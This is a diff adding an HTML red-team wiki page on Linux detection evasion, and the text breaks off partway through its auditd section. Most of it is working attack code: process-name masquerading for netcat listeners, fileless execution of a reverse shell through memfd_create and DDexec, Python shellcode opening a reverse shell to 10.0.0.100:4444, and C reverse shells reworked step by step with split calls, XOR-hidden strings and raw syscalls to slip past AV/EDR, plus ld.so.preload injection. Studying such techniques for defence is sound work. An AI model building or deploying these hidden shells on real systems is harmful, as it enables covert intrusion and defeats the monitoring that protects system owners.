@@ -1,0 +1,1164 @@
+<!DOCTYPE html>
+<html lang="en">
+	<head>
+		<title>Evasion | Cookie Engineer's Cyber Wiki</title>
+
+		<!-- Meta -->
+		<meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=0.5, maximum-scale=2, user-scalable=yes">
+		<meta name="mobile-web-app-capable" content="yes">
+		<meta name="mobile-web-app-status-bar-style" content="black-translucent">
+		<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+		<meta http-equiv="X-UA-Compatible" content="IE=edge">
+		<meta name="creator" content="Cookie Engineer">
+		<meta name="description" content="Evasion">
+		<meta name="keywords" content="auditd-bypass, av-bypass, edr-evasion, evasion, fileless-execution, lotl, memory-execution, network-evasion, process-masquerading, redteam, shellcode">
+		<meta name="generator" content="Cookie Engineer's bare hands with peppermint tea and nightly VIM coding sessions">
+		<meta name="robots" content="index, follow">
+
+		<!-- Social Media -->
+		<meta property="og:title" content="Evasion">
+		<meta property="og:site_name" content="Cookie Engineer's Wiki">
+		<meta property="og:description" content="Avoiding detection at every stage - AV/EDR evasion for executables, Linux process masquerading, fileless execution, auditd bypass, network traffic obfuscation, and living off the land.">
+		<meta property="og:image" itemprop="image" content="https://cookie.engineer/design/about/cookiengineer.jpg">
+		<meta property="og:url" content="https://cookie.engineer/wiki/articles/redteam/evasion.md">
+		<meta property="og:type" content="article">
+
+		<!-- Shitter -->
+		<meta name="twitter:card" content="summary">
+		<meta name="twitter:domain" content="cookie.engineer">
+		<meta name="twitter:title" itemprop="name" content="Evasion">
+		<meta name="twitter:description" itemprop="description" content="Avoiding detection at every stage - AV/EDR evasion for executables, Linux process masquerading, fileless execution, auditd bypass, network traffic obfuscation, and living off the land.">
+		<meta name="twitter:image" itemprop="image" content="https://cookie.engineer/design/about/cookiengineer.jpg">
+
+		<!-- Website Design -->
+		<link rel="stylesheet" href="/design/index.css">
+		<link rel="stylesheet" href="/design/highlight.css">
+		<script type="module" src="/design/index.mjs" defer></script>
+	</head>
+	<body data-layout="article">
+		<header>
+			<div><button data-action="toggle-aside" title="Toggle Sidebar" class="visible"></button><button data-action="toggle-theme" title="Switch Dark/Light Theme"></button><button data-action="toggle-font" title="Switch Dyslexic/Normal Fonts"></button><button data-action="open-website" title="Navigate to Website Index"></button><button data-action="open-wiki" title="Navigate to Wiki Index"></button></div>
+			<div><img src="/design/about/cookiengineer.png" width="32" height="32" /><h1><a href="/wiki/index.html">Cookie Engineer's Cyber Wiki</a></h1></div>
+			<div></div>
+		</header>
+
+		<div>
+		<aside class="visible">
+			<ul class="toc">
+				<li>
+					<b><a href="#overview">Overview</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#required-reading">Required Reading</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#the-evasion-mindset">The Evasion Mindset</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#linux-process-evasion">Linux Process Evasion</a></b>
+					<ul>
+						<li><a href="#understanding-what-defenders-see">Understanding What Defenders See</a></li>
+						<li><a href="#process-masquerading-argv">Process Masquerading - argv</a></li>
+						<li><a href="#syscall-level-process-masquerading">syscall-Level Process Masquerading</a></li>
+						<li><a href="#ppid-spoofing">PPID Spoofing</a></li>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#fileless-execution-on-linux">Fileless Execution on Linux</a></b>
+					<ul>
+						<li><a href="#memfd-create-anonymous-in-memory-files">memfd_create - Anonymous In-Memory Files</a></li>
+						<li><a href="#devshm-execution">/dev/shm Execution</a></li>
+						<li><a href="#ddexec-self-overwriting-execution">DDexec Self-Overwriting Execution</a></li>
+						<li><a href="#python-fileless-shellcode">Python Fileless Shellcode</a></li>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#avedr-evasion-for-linux-binaries">AV/EDR Evasion for Linux Binaries</a></b>
+					<ul>
+						<li><a href="#what-triggers-detection">What Triggers Detection</a></li>
+						<li><a href="#step-1-split-heuristic-pattern">Step 1: Split Heuristic Pattern</a></li>
+						<li><a href="#step-2-compile-time-string-obfuscation">Step 2: Compile-Time String Obfuscation</a></li>
+						<li><a href="#step-3-raw-syscalls">Step 3: Raw Syscalls</a></li>
+						<li><a href="#step-4-append-junk">Step 4: Append Junk</a></li>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#linux-auditd-evasion">Linux auditd Evasion</a></b>
+					<ul>
+						<li><a href="#understanding-auditd-coverage">Understanding auditd Coverage</a></li>
+						<li><a href="#alternative-execution-paths">Alternative Execution Paths</a></li>
+						<li><a href="#ld-preload-unhooking">LD_PRELOAD Unhooking</a></li>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#network-evasion">Network Evasion</a></b>
+					<ul>
+						<li><a href="#c2-beacon-with-jitter">C2 Beacon with Jitter</a></li>
+						<li><a href="#protocol-detection-risk-table">Protocol Detection Risk Table</a></li>
+						<li><a href="#dns-exfiltration-chunked">DNS Exfiltration Chunked</a></li>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#log-evasion">Log Evasion</a></b>
+					<ul>
+						<li><a href="#shell-history-manipulation">Shell History Manipulation</a></li>
+						<li><a href="#truncating-system-logs">Truncating System Logs</a></li>
+						<li><a href="#timestomping">Timestomping</a></li>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#living-off-the-land-lotl">Living Off the Land (LotL)</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#practical-evasion-workflow">Practical Evasion Workflow</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#challenge">Challenge</a></b>
+					<ul>
+						<li><a href="#lab-objectives">Lab objectives</a></li>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#references">References</a></b>
+					<ul>
+					</ul>
+				</li>
+			</ul>
+		</aside>
+
+			<main>
+				<nav aria-label="breadcrumbs">
+					<ol>
+						<li><a href="/wiki/index.html">Wiki</a></li>
+						<li><a href="/wiki/articles/redteam/index.html">Redteam</a></li>
+						<li aria-current="page"><a href="/wiki/articles/redteam/evasion.html">Evasion</a></li>
+					</ol>
+				</nav>
+
+				<article>
+					<h2 id="evasion">Evasion</h2>
+					<p>
+						Avoiding detection at every stage - AV/
+						<abbr title="Endpoint Detection and Response">EDR</abbr>
+						evasion for executables,
+						Linux process masquerading, fileless execution, auditd bypass, network traffic obfuscation,
+						and living off the land.
+					</p>
+					<section>
+						<h3 id="overview">Overview</h3>
+						<p>
+							Evasion is the practice of staying below the threshold of the sensors running on the same host
+							you are operating on. This article covers Linux process masquerading, in-memory execution, auditd
+							gaps, network covert channels, log tampering, and living-off-the-land techniques, and pairs
+							each technique with the detection signal it is designed to avoid.
+						</p>
+					</section>
+					<section>
+						<h3 id="required-reading">Required Reading</h3>
+						<ul>
+							<li><a href="/wiki/articles/fundamentals/processes.html">/wiki/articles/fundamentals/processes.html</a> - process creation, fork/exec, process tree, /proc/PID/maps, /proc/PID/mem</li>
+							<li><a href="/wiki/articles/fundamentals/system-calls.html">/wiki/articles/fundamentals/system-calls.html</a> - syscall instruction, syscall numbers, userland-to-kernel transition, syscall hooking mechanisms</li>
+							<li><a href="/wiki/articles/fundamentals/virtual-memory.html">/wiki/articles/fundamentals/virtual-memory.html</a> - memory mapping (mmap), anonymous vs file-backed mappings, /proc/PID/maps interpretation</li>
+							<li><a href="/wiki/articles/fundamentals/elf.html">/wiki/articles/fundamentals/elf.html</a> - ELF format, segments, program headers, execution flow from kernel perspective</li>
+							<li><a href="/wiki/articles/fundamentals/stack.html">/wiki/articles/fundamentals/stack.html</a> - stack layout, stack frames, <abbr title="Return-Oriented Programming">ROP</abbr> fundamentals</li>
+							<li><a href="/wiki/articles/fundamentals/calling-conventions.html">/wiki/articles/fundamentals/calling-conventions.html</a> - x86-64 System V ABI, register usage, function argument passing</li>
+						</ul>
+					</section>
+					<section>
+						<h3 id="the-evasion-mindset">The Evasion Mindset</h3>
+						<p>
+							Evasion is not a checkbox - it is a continuous feedback loop applied to every action you take
+							on a compromised system. Every process you spawn, every file you write to disk, every network
+							connection you establish, and every command you execute is potentially observed. The defender's
+							sensors are on the same system you're operating on. Your job is to understand those sensors
+							and find the gaps between them.
+						</p>
+						<p>
+							Defense-in-depth means multiple overlapping detection layers. You evade by exploiting the seams
+							between them:
+						</p>
+						<table>
+							<thead>
+								<tr>
+									<th align="center">Detection Layer</th>
+									<th align="center">Seam to Exploit</th>
+								</tr>
+							</thead>
+							<tbody>
+								<tr>
+									<td align="center">Signature-based AV</td>
+									<td align="center">Modify binary</td>
+								</tr>
+								<tr>
+									<td align="center">Heuristic AV/EDR</td>
+									<td align="center">Change behavior</td>
+								</tr>
+								<tr>
+									<td align="center">Userland API hooks</td>
+									<td align="center">Direct syscalls</td>
+								</tr>
+								<tr>
+									<td align="center">Kernel callbacks</td>
+									<td align="center">Syscall fuzzing</td>
+								</tr>
+								<tr>
+									<td align="center">ETW (Event Tracing)</td>
+									<td align="center">Patch ETW</td>
+								</tr>
+								<tr>
+									<td align="center">AMSI (Antimalware Scan)</td>
+									<td align="center">Force failure</td>
+								</tr>
+								<tr>
+									<td align="center">PowerShell logging</td>
+									<td align="center">Unmanaged PS</td>
+								</tr>
+								<tr>
+									<td align="center">Auditd (Linux)</td>
+									<td align="center">Avoid execve</td>
+								</tr>
+								<tr>
+									<td align="center">Network IDS</td>
+									<td align="center">Encapsulate</td>
+								</tr>
+								<tr>
+									<td align="center">SIEM correlation</td>
+									<td align="center">Low-and-slow</td>
+								</tr>
+							</tbody>
+						</table>
+						<p>
+							The golden rule of evasion: The more like normal system behavior your actions appear, the less
+							alerting they generate. Every deviation from baseline is a detection opportunity for the defender.
+						</p>
+						<p>---</p>
+					</section>
+					<section>
+						<h3 id="linux-process-evasion">Linux Process Evasion</h3>
+						<h4 id="understanding-what-defenders-see">Understanding What Defenders See</h4>
+						<p>When you execute a command on Linux, multiple logging systems capture evidence:</p>
+						<pre class="bash">
+# auditd logs execve syscalls:
+# type=SYSCALL msg=audit(1624320000.123:456): arch=c000003e syscall=59
+#   success=yes exit=0 a0=7f... a1=7f... a2=7f... a3=0 items=2
+#   ppid=1234 pid=5678 auid=1000 uid=0 gid=0 euid=0 suid=0 ...
+
+# bash history records the command text:
+# ~/.bash_history: nc -lvnp 4444
+
+# /proc/PID/cmdline records argv (null-separated):
+cat /proc/5678/cmdline | tr &#39;\0&#39; &#39; &#39;
+# /usr/bin/nc -lvnp 4444
+
+# /proc/PID/exe symlinks to the binary:
+readlink /proc/5678/exe
+# /usr/bin/nc
+						</pre>
+						<p>
+							Each mechanism leaves a different forensic trace. Evasion means controlling each independently
+							<ul>
+								<li>you don't need to defeat all of them, just the ones the defenders actively monitor.</li>
+							</ul>
+						</p>
+						<h4 id="process-masquerading-argv">Process Masquerading - argv</h4>
+						<p>
+							The first element in argv is
+							<code>argv[0]</code>
+							, the name a process reports to
+							<code>ps</code>
+							,
+							<code>top</code>
+							, and
+							<code>/proc/PID/cmdline</code>
+							. Before calling
+							<code>execve</code>
+							, a program can rewrite
+							<code>argv[0]</code>
+							to anything it likes, so the name
+							shown to defenders is fully attacker-controlled.
+						</p>
+						<pre class="bash">
+# exec -a: execute a program with a custom argv[0]
+exec -a &#34;[kworker/u8:2]&#34; /usr/bin/nc -lvnp 4444
+
+# Verify what shows in ps:
+ps aux | grep kworker
+# Shows &#34;[kworker/u8:2]&#34; — appears as a kernel thread at a glance
+
+# The real /proc/PID/exe still points to /usr/bin/nc:
+readlink /proc/$(pgrep -f &#34;nc -lvnp&#34;)/exe
+
+# Overwrite cmdline after execution for full coverage:
+python3 -c &#34;
+import os
+pid = $(pgrep -f &#39;nc -lvnp&#39;)
+with open(f&#39;/proc/{pid}/cmdline&#39;, &#39;wb&#39;) as f:
+    f.write(b&#39;systemd-journald\x00&#39;)
+&#34;
+# shell-initiated processes can overwrite their own /proc/PID/cmdline
+# if run as root or the same UID
+						</pre>
+						<h4 id="syscall-level-process-masquerading">syscall-Level Process Masquerading</h4>
+						<p>In C, manipulate argv before exec to control what appears in process listings:</p>
+						<pre class="c">
+// masquerade_exec.c — Spawn a process with arbitrary argv[0]
+#include &lt;unistd.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+
+int main(int argc, char *argv[]) {
+    if (argc &lt; 3) {
+        fprintf(stderr, &#34;Usage: %s &lt;fake_name&gt; &lt;program&gt; [args...]\n&#34;, argv[0]);
+        return 1;
+    }
+
+    char *fake_name = argv[1];
+    char *program   = argv[2];
+    char **prog_args = &amp;argv[2];
+
+    // Overwrite argv[2] (the program path) with the fake name
+    // The kernel copies argv from execve directly into /proc/PID/cmdline
+    prog_args[0] = fake_name;
+
+    execvp(program, prog_args);
+    perror(&#34;execvp&#34;);
+    return 1;
+}
+						</pre>
+						<pre class="bash">
+gcc -o masquerade_exec masquerade_exec.c
+./masquerade_exec &#39;[kworker/u8:5]&#39; /usr/bin/ncat -lvnp 4444
+# ps shows: [kworker/u8:5] -lvnp 4444
+						</pre>
+						<h4 id="ppid-spoofing">PPID Spoofing</h4>
+						<p>
+							Defenders trace parent-child process relationships. A shell spawning a network listener is suspicious.
+							A process that is a child of init (PID 1) is less notable - many system services are reparented
+							to init.
+						</p>
+						<pre class="bash">
+# Double fork — the intermediate parent exits, child becomes orphan:
+(
+    /usr/bin/nc -lvnp 4444 &amp;
+    CHILD_PID=$!
+    disown $CHILD_PID
+    # The subshell exits, init adopts the child
+    # ppid of nc becomes 1 (systemd/init)
+)
+
+# Simpler orphan:
+( /usr/bin/nc -lvnp 4444 &amp; )
+# Parent shell exits; nc reparented to init
+						</pre>
+						<p>---</p>
+					</section>
+					<section>
+						<h3 id="fileless-execution-on-linux">Fileless Execution on Linux</h3>
+						<p>
+							Fileless execution means running code without writing an executable file to disk. This defeats
+							file-based AV scanning, leaves no executable artifact on the filesystem, and avoids auditd's
+							file creation logs.
+						</p>
+						<h4 id="memfd-create-anonymous-in-memory-files">memfd_create - Anonymous In-Memory Files</h4>
+						<p>
+							The
+							<code>memfd_create</code>
+							syscall (Linux 3.17+) creates an anonymous file backed by RAM. It has a name
+							visible in
+							<code>/proc/PID/fd/</code>
+							but no corresponding inode on any filesystem.
+							<code>fexecve</code>
+							executes
+							a file descriptor; glibc 2.27 and later implement it with the
+							<code>execveat</code>
+							syscall, which the
+							kernel added in Linux 3.19.
+						</p>
+						<pre class="c">
+// memfd_exec.c — Execute an ELF binary from memory
+// Build: gcc -o memfd_exec memfd_exec.c
+// Usage: ./memfd_exec &lt;elf_binary_path&gt; [fake_proc_name] [args...]
+
+#define _GNU_SOURCE
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;sys/mman.h&gt;
+#include &lt;sys/syscall.h&gt;
+#include &lt;sys/stat.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;errno.h&gt;
+
+static int memfd_create_wrapper(const char *name, unsigned int flags) {
+    return syscall(SYS_memfd_create, name, flags);
+}
+
+int main(int argc, char *argv[]) {
+    if (argc &lt; 2) {
+        fprintf(stderr, &#34;Usage: %s &lt;executable&gt; [fake_proc_name] [args...]\n&#34;, argv[0]);
+        return 1;
+    }
+
+    // Read the ELF into memory
+    int fd = open(argv[1], O_RDONLY);
+    if (fd &lt; 0) { perror(&#34;open&#34;); return 1; }
+
+    struct stat st;
+    fstat(fd, &amp;st);
+    unsigned char *elf_data = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, fd, 0);
+    close(fd);
+
+    if (elf_data == MAP_FAILED) { perror(&#34;mmap&#34;); return 1; }
+
+    // Create anonymous in-memory file
+    int memfd = memfd_create_wrapper(&#34;&#34;, MFD_CLOEXEC);
+    if (memfd &lt; 0) { perror(&#34;memfd_create&#34;); return 1; }
+
+    // Write ELF to the anonymous file
+    if (write(memfd, elf_data, st.st_size) != st.st_size) {
+        perror(&#34;write&#34;); return 1;
+    }
+
+    // Prepare args for fexecve
+    char **exec_args = &amp;argv[2];  // argv[2] becomes argv[0] for new process
+    fexecve(memfd, exec_args, NULL);
+    perror(&#34;fexecve&#34;);
+    return 1;
+}
+						</pre>
+						<pre class="bash">
+gcc -o memfd_exec memfd_exec.c
+
+# Execute a reverse shell from memory with fake process name:
+./memfd_exec /tmp/reverse_shell &#34;[kjournald]&#34; &#34;[kjournald]&#34;
+
+# The binary never touches the filesystem after initial read
+# /proc/PID/exe → /memfd: (deleted)
+# No auditd file creation event for the execution
+						</pre>
+						<h4 id="devshm-execution">/dev/shm Execution</h4>
+						<p>
+							<code>/dev/shm</code>
+							is a tmpfs (RAM-backed filesystem). Files written here never touch disk. Many
+							<abbr title="Endpoint Detection and Response">EDR</abbr>
+							s scan
+							<code>/tmp</code>
+							and
+							<code>/var/tmp</code>
+							but skip
+							<code>/dev/shm</code>
+							.
+						</p>
+						<pre class="bash">
+# Copy binary to /dev/shm and execute:
+cp /tmp/reverse_shell /dev/shm/.cache_update
+chmod +x /dev/shm/.cache_update
+/dev/shm/.cache_update &amp;
+
+# Verify it&#39;s running from RAM:
+ls -la /proc/$(pgrep cache_update)/exe
+# → /dev/shm/.cache_update (deleted)  [after unlinking]
+
+# Unlink after execution to remove the filename entry:
+rm /dev/shm/.cache_update
+# Process continues running; the inode is held open by the process
+						</pre>
+						<h4 id="ddexec-self-overwriting-execution">DDexec Self-Overwriting Execution</h4>
+						<p>
+							DDexec overwrites its own process memory with a new ELF binary, then transfers control to it
+							<ul>
+								<li>no new process, no execve syscall, no <code>/proc</code> entry for a new process.</li>
+							</ul>
+						</p>
+						<pre class="bash">
+wget https://raw.githubusercontent.com/arget13/DDexec/main/dd-exec.sh
+chmod +x dd-exec.sh
+
+# Execute a binary entirely in memory (self-overwrite):
+./dd-exec.sh -p $(cat /proc/self/stat | awk &#39;{print $1}&#39;) -b /tmp/reverse_shell
+
+# The dd-exec process transforms into reverse_shell in-place.
+# auditd sees: dd-exec.sh started → dd-exec.sh still running
+# No execve event, no new PID.
+						</pre>
+						<h4 id="python-fileless-shellcode">Python Fileless Shellcode</h4>
+						<pre class="bash">
+python3 -c &#34;
+import ctypes, os
+
+# msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.0.100 LPORT=4444 -f py
+shellcode  = b&#39;\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05&#39;
+shellcode += b&#39;\x48\x97\x48\xb9\x02\x00\x11\x5c\x0a\x00\x00\x64&#39;
+shellcode += b&#39;\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05&#39;
+shellcode += b&#39;\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75&#39;
+shellcode += b&#39;\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f&#39;
+shellcode += b&#39;\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6&#39;
+shellcode += b&#39;\x0f\x05&#39;
+
+libc = ctypes.CDLL(None)
+PROT_RWX = 7
+MAP_PRIVATE_ANON = 0x22
+buf = libc.mmap(0, 4096, PROT_RWX, MAP_PRIVATE_ANON, -1, 0)
+ctypes.memmove(buf, shellcode, len(shellcode))
+ctypes.CFUNCTYPE(None)(buf)()
+&#34;
+# The reverse shell executes inside Python&#39;s process space
+# ps shows: python3 -c &#34;...&#34;
+# No /proc/PID/exe change, no execve event
+						</pre>
+						<p>---</p>
+					</section>
+					<section>
+						<h3 id="avedr-evasion-for-linux-binaries">AV/EDR Evasion for Linux Binaries</h3>
+						<h4 id="what-triggers-detection">What Triggers Detection</h4>
+						<table>
+							<thead>
+								<tr>
+									<th align="center">Detection Method</th>
+									<th align="center">What It Matches On</th>
+									<th align="center">Evasion Technique</th>
+								</tr>
+							</thead>
+							<tbody>
+								<tr>
+									<td align="center">Byte signature</td>
+									<td align="center">Static byte sequence (hash/fuzzy)</td>
+									<td align="center">Modify instructions, reorder code, add NOPs</td>
+								</tr>
+								<tr>
+									<td align="center">String signature</td>
+									<td align="center">Known strings ("reverse shell")</td>
+									<td align="center">XOR encrypt strings, compile-time obfuscation</td>
+								</tr>
+								<tr>
+									<td align="center">Import table</td>
+									<td align="center">Library function usage pattern</td>
+									<td align="center">Static linking, raw syscalls</td>
+								</tr>
+								<tr>
+									<td align="center">Heuristics</td>
+									<td align="center">socket->connect->dup2->execve sequence</td>
+									<td align="center">Split across functions, delayed execution</td>
+								</tr>
+								<tr>
+									<td align="center">Entropy</td>
+									<td align="center">High-entropy sections (encrypted payloads)</td>
+									<td align="center">Add low-entropy filler</td>
+								</tr>
+								<tr>
+									<td align="center">YARA rules</td>
+									<td align="center">Complex pattern matching</td>
+									<td align="center">Identify rules, break patterns</td>
+								</tr>
+							</tbody>
+						</table>
+						<h4 id="step-1-split-heuristic-pattern">Step 1: Split Heuristic Pattern</h4>
+						<p>Starting from a naive reverse shell:</p>
+						<pre class="c">
+// naive_revshell.c — detected by any heuristic AV
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;sys/socket.h&gt;
+#include &lt;arpa/inet.h&gt;
+
+int main(void) {
+    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
+    struct sockaddr_in remote_addr = {
+        .sin_family = AF_INET,
+        .sin_port = htons(4444)
+    };
+    inet_pton(AF_INET, &#34;10.0.0.100&#34;, &amp;remote_addr.sin_addr);
+    connect(sockfd, (struct sockaddr *)&amp;remote_addr, sizeof(remote_addr));
+    dup2(sockfd, 0); dup2(sockfd, 1); dup2(sockfd, 2);
+    execve(&#34;/bin/sh&#34;, NULL, NULL);
+    return 0;
+}
+						</pre>
+						<p>
+							Refactored to break the sequential
+							<abbr title="Application Programming Interface">API</abbr>
+							pattern:
+						</p>
+						<pre class="c">
+// split_revshell.c — API calls scattered across functions
+#define _GNU_SOURCE
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;sys/socket.h&gt;
+#include &lt;arpa/inet.h&gt;
+#include &lt;time.h&gt;
+
+// Decoy function — adds noise to call graph analysis
+__attribute__((noinline))
+static int do_noise(void) {
+    volatile int x = 0;
+    for (int i = 0; i &lt; 50; i++) x += (i * 7) % 13;
+    return x;
+}
+
+__attribute__((noinline))
+static int make_socket(void) {
+    do_noise();
+    return socket(AF_INET, SOCK_STREAM, 0);
+}
+
+__attribute__((noinline))
+static void do_connect(int sockfd, const char *ip, unsigned short port) {
+    struct sockaddr_in addr = { .sin_family = AF_INET, .sin_port = htons(port) };
+    inet_pton(AF_INET, ip, &amp;addr.sin_addr);
+    do_noise();
+    connect(sockfd, (struct sockaddr *)&amp;addr, sizeof(addr));
+    do_noise();
+}
+
+__attribute__((noinline))
+static void redirect_stdio(int sockfd) {
+    do_noise();
+    dup2(sockfd, 0); dup2(sockfd, 1); dup2(sockfd, 2);
+}
+
+__attribute__((noinline))
+static void launch_shell(void) {
+    do_noise();
+    execve(&#34;/bin/sh&#34;, NULL, NULL);
+}
+
+int main(void) {
+    int fd = make_socket();
+    do_connect(fd, &#34;10.0.0.100&#34;, 4444);
+    redirect_stdio(fd);
+    launch_shell();
+    return 0;
+}
+						</pre>
+						<p>
+							The
+							<code>noinline</code>
+							attribute forces each function to appear individually in the binary, breaking
+							the linear call-graph signature.
+						</p>
+						<h4 id="step-2-compile-time-string-obfuscation">Step 2: Compile-Time String Obfuscation</h4>
+						<pre class="c">
+// str_obfuscated_revshell.c — Strings encrypted at rest in the binary
+#define _GNU_SOURCE
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;sys/socket.h&gt;
+#include &lt;arpa/inet.h&gt;
+
+// XOR key — change per compilation to rotate signatures
+#define XKEY 0x7D
+
+// XOR-encrypted &#34;/bin/sh&#34;
+static char binsh[] = {
+    0x53 ^ XKEY, 0x53 ^ XKEY, 0x0E ^ XKEY, 0x16 ^ XKEY,
+    0x19 ^ XKEY, 0x53 ^ XKEY, 0x0C ^ XKEY, 0x15 ^ XKEY, 0x00 ^ XKEY
+};
+
+static void str_decrypt(char *buf, size_t len, char key) {
+    for (size_t i = 0; i &lt; len; i++) buf[i] ^= key;
+}
+
+int main(void) {
+    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
+    struct sockaddr_in addr = { .sin_family = AF_INET, .sin_port = htons(4444) };
+    inet_pton(AF_INET, &#34;10.0.0.100&#34;, &amp;addr.sin_addr);
+    connect(sockfd, (struct sockaddr *)&amp;addr, sizeof(addr));
+    dup2(sockfd, 0); dup2(sockfd, 1); dup2(sockfd, 2);
+
+    str_decrypt(binsh, sizeof(binsh), XKEY);
+    execve(binsh, NULL, NULL);
+    return 0;
+}
+						</pre>
+						<pre class="bash">
+gcc -O2 -s -fvisibility=hidden -fno-stack-protector \
+    -o revshell_obf str_obfuscated_revshell.c
+strip --strip-all revshell_obf
+						</pre>
+						<h4 id="step-3-raw-syscalls">Step 3: Raw Syscalls</h4>
+						<p>
+							<abbr title="Endpoint Detection and Response">EDR</abbr>
+							s hook libc functions via LD_PRELOAD or ptrace. Direct
+							syscalls in inline assembly bypass these hooks entirely because they never call the hooked libc
+							wrapper.
+						</p>
+						<pre class="c">
+// raw_syscall_revshell.c — Zero libc networking calls
+#define _GNU_SOURCE
+#include &lt;unistd.h&gt;
+#include &lt;sys/syscall.h&gt;
+
+static long sys(long n, long a1, long a2, long a3, long a4, long a5, long a6) {
+    register long r10 asm(&#34;r10&#34;) = a4;
+    register long r8  asm(&#34;r8&#34;)  = a5;
+    register long r9  asm(&#34;r9&#34;)  = a6;
+    long ret;
+    asm volatile(&#34;syscall&#34;
+        : &#34;=a&#34;(ret)
+        : &#34;a&#34;(n), &#34;D&#34;(a1), &#34;S&#34;(a2), &#34;d&#34;(a3), &#34;r&#34;(r10), &#34;r&#34;(r8), &#34;r&#34;(r9)
+        : &#34;rcx&#34;, &#34;r11&#34;, &#34;memory&#34;);
+    return ret;
+}
+
+struct sin {
+    unsigned short family;   // sin_family
+    unsigned short port;     // sin_port
+    unsigned int   addr;     // sin_addr.s_addr
+    unsigned char  zero[8];
+};
+
+int _start(void) {
+    // socket(AF_INET=2, SOCK_STREAM=1, 0)
+    long fd = sys(SYS_socket, 2, 1, 0, 0, 0, 0);
+    if (fd &lt; 0) { sys(SYS_exit, 1, 0, 0, 0, 0, 0); }
+
+    // 10.0.0.100:4444 — pre-computed network byte order
+    struct sin addr = {
+        .family = 2,          // AF_INET
+        .port   = 0x5c11,     // htons(4444) = 0x115c → 0x5c11
+        .addr   = 0x6400000a  // inet_addr(&#34;10.0.0.100&#34;) = 0x0a000064 → little-endian 0x6400000a
+    };
+
+    sys(SYS_connect, fd, (long)&amp;addr, 16, 0, 0, 0);
+
+    // dup2 to redirect stdin/out/err
+    sys(SYS_dup2, fd, 0, 0, 0, 0, 0);
+    sys(SYS_dup2, fd, 1, 0, 0, 0, 0);
+    sys(SYS_dup2, fd, 2, 0, 0, 0, 0);
+
+    // execve(&#34;/bin//sh&#34;, NULL, NULL) — double slash for 8-byte alignment
+    char path[] = &#34;/bin//sh&#34;;
+    sys(SYS_execve, (long)path, 0, 0, 0, 0, 0);
+
+    sys(SYS_exit, 0, 0, 0, 0, 0, 0);
+}
+						</pre>
+						<pre class="bash">
+# Compile as fully standalone ELF (no libc, no dynamic linker):
+gcc -nostdlib -static -O2 -s \
+    -Wl,--entry=_start \
+    -o revshell_raw raw_syscall_revshell.c
+
+# Verify no shared library dependencies:
+ldd revshell_raw
+# → &#34;not a dynamic executable&#34;
+
+# Size: ~5 KB — entirely self-contained
+ls -la revshell_raw
+
+# This binary makes zero libc calls. LD_PRELOAD hooks have no effect.
+# EDRs that hook libc functions see nothing from this process.
+						</pre>
+						<h4 id="step-4-append-junk">Step 4: Append Junk</h4>
+						<pre class="bash">
+# Append random data beyond ELF segment boundaries:
+dd if=/dev/urandom bs=1024 count=10 &gt;&gt; revshell_raw
+
+# The appended data is beyond LOAD segment boundaries — ignored by the loader,
+# but changes the file hash and disrupts whole-file signature matching.
+
+# Verify the binary still runs:
+./revshell_raw
+# Works identically
+						</pre>
+						<p>---</p>
+					</section>
+					<section>
+						<h3 id="linux-auditd-evasion">Linux auditd Evasion</h3>
+						<p>
+							auditd monitors syscalls based on configured rules. The most common rule sets monitor
+							<code>execve</code>
+							(process execution) and file access.
+						</p>
+						<h4 id="understanding-auditd-coverage">Understanding auditd Coverage</h4>
+						<pre class="bash">
+# List active audit rules:
+auditctl -l
+
+# Typical red-team-relevant rules:
+# -a always,exit -F arch=b64 -S execve -k process_execution
+# -a always,exit -F arch=b64 -S connect -k network_connect
+# -a always,exit -F arch=b64 -S bind -k network_bind
+# -a always,exit -F arch=b64 -S ptrace -k process_trace
+# -w /etc/shadow -p rwa -k shadow_access
+# -w /etc/passwd -p wa -k passwd_modify
+						</pre>
+						<p>
+							Key insight: auditd rules are explicit. If a syscall is not listed, it is not audited. Many
+							configurations cover
+							<code>execve</code>
+							(59) but forget
+							<code>execveat</code>
+							(322). The
+							<code>memfd_create + fexecve</code>
+							technique from earlier exploits this gap because
+							<code>fexecve</code>
+							internally calls the
+							<code>execveat</code>
+							syscall
+							<ul>
+								<li>not <code>execve</code> .</li>
+							</ul>
+						</p>
+						<h4 id="alternative-execution-paths">Alternative Execution Paths</h4>
+						<pre class="bash">
+# 1. Shared library injection via ld.so.preload:
+echo &#34;/dev/shm/libhook.so&#34; &gt;&gt; /etc/ld.so.preload
+# Every new process loads your library automatically
+# No execve audit event for your code — it piggybacks on legitimate processes
+
+# 2. Cron/at jobs — execution from cron context, not your shell:
